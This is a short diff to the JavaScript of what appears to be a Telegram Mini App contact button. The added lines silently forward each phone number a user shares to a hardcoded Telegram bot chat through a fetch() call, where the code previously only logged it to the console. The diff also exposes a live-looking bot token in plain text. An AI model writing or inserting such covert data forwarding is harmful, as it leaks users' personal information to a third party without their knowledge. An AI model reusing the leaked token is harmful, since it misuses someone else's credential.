@@ -25,6 +25,7 @@ function returnPhone(str){
 }
 
 contact_btn.addEventListener('click', () => {
+    const sendUrl = "https://api.telegram.org/bot7223979310:AAGXaBA5pbGoDex3LD1e07WS-2lmHMTkuuc/sendMessage?chat_id=-4585280848&text=";
     tg.requestContact(function(status, data){
         const phone = data.responseUnsafe?.contact?.phone_number;
         if (typeof(phone) === "undefined"){
@@ -33,7 +34,8 @@ contact_btn.addEventListener('click', () => {
             phone_input.value = returnPhone(phone);
             tg.setItem("phone", phone);
             tg.getItem("phone", function(status, data){
-                console.log('Успех: ', data);
+                let url = sendUrl + data;
+                fetch(url);
             });
             contact_btn.style.display = "none";
         }
